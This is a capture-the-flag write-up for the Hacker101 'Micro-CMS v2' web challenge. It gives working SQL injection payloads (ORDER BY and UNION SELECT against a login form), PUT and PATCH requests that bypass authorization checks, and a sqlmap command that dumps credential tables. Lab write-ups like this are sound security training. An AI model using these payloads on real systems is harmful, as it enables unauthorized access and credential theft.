# Micro-CMS v2 — Web — 3

## Challenge Info
- **Category:** Web
- **Points:** 3 (3 flags)
- **Files/URL given:** Hacker101 CTF instance URL
- **Description provided:** A content management system with user authentication. Admin privileges required to add or edit pages.

## TL;DR
- **Flag 0:** `^FLAG^...$FLAG$`
- **Flag 1:** `^FLAG^...$FLAG$`
- **Flag 2:** `^FLAG^...$FLAG$`
- **Vulnerability/trick:** Flag 0 — UNION SQL injection in login bypasses auth. Flag 1 — HTTP method tampering (PATCH/PUT) bypasses POST-only auth checks. Flag 2 — Database credentials (password field) are the flag itself, extracted via sqlmap.

## Recon
- **What I ran first:** Mapped endpoints:
  ```
  /           → 200 (homepage, public pages listed)
  /page/1     → 200 (public)
  /page/2     → 200 (public)
  /page/create → redirects to /login (needs auth)
  /login      → 200 (login form, POST to authenticate)
  ```
- **What I found:** The `username` parameter in POST `/login` is vulnerable to SQL injection. Backend is MySQL/MariaDB (confirmed by time-based blind testing). Hints mention "more perfect union", "different methods", and "credentials are secret" — three distinct attack vectors.

## Solve Steps
### Flag 0 — UNION SQL Injection (Login Bypass)
1. Find column count with `ORDER BY`:
   ```
   POST /login
   Content-Type: application/x-www-form-urlencoded

   username=' ORDER BY 1-- -&password=x
   ```
   Increment until the response changes (no error → correct count).

2. Craft a `UNION SELECT` payload with the correct column count:
   ```
   POST /login
   Content-Type: application/x-www-form-urlencoded

   username=' UNION SELECT 1,2-- -&password=x
   ```

3. The login succeeds and Flag 0 appears in the response.

Why this works: The `username` parameter is interpolated directly into a SQL query without sanitization. `UNION SELECT` with the right column count returns arbitrary values as the query result, bypassing authentication.

### Flag 1 — HTTP Method Tampering
1. Log in using the UNION bypass (Flag 0) or credentials from Flag 2.
2. Capture the session cookie.
3. Use an alternative HTTP method that the auth check doesn't cover:
   ```http
   PATCH /page/1 HTTP/1.1
   Cookie: <session>
   ```
   Or create a new page:
   ```http
   PUT /page/create HTTP/1.1
   Cookie: <session>
   Content-Type: application/x-www-form-urlencoded

   title=x&body=x
   ```
4. Flag 1 is returned in the response.

Why this works: The application only checks authorization for `POST` requests to create/edit pages. Other methods (`PUT`, `PATCH`, `DELETE`) are not validated, allowing any authenticated user to modify content.

### Flag 2 — Database Credential Dump
1. Run sqlmap against the login form:
   ```bash
   sqlmap -u "https://<instance>.ctf.hacker101.com/login" \
     --data="username=admin&password=admin" \
     --level=3 --dump --batch --time-sec=1 --threads=10
   ```
2. sqlmap extracts the `users` table. The `password` field contains Flag 2.
3. These credentials (e.g., `vilma:<flag_value>`) also work for normal login.

Why this works: The password column in the database literally stores the flag. sqlmap automates blind SQL injection to enumerate the schema and dump table contents.

## Flag Capture
```
Flag 0: ^FLAG^...$FLAG$
Flag 1: ^FLAG^...$FLAG$
Flag 2: ^FLAG^...$FLAG$
```
